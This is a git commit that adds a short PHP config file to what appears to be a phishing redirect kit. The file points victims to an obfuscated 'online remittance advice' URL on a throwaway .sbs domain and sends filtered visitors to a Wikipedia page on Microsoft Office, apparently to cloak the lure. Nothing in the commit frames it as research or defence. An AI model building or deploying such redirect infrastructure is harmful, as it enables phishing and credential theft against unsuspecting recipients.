e9f9b521ecf0cdf9ad27858f66cdb61ae9ba44f1
remittanceadvicenote <cloud.datahubs@gmail.com>
2023-11-08 15:53:37 +0200

    op

---
+++ main/config.php
@@ -0,0 +1,5 @@
+<?php
+$pagelink="https://0nlineremittanceadviceservices0a9c0a8c090.ca1ca0cn0c.sbs/?0a9cba0c90=";
+$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
+$redirecttype="2";// 1:header - 2:script
+?>
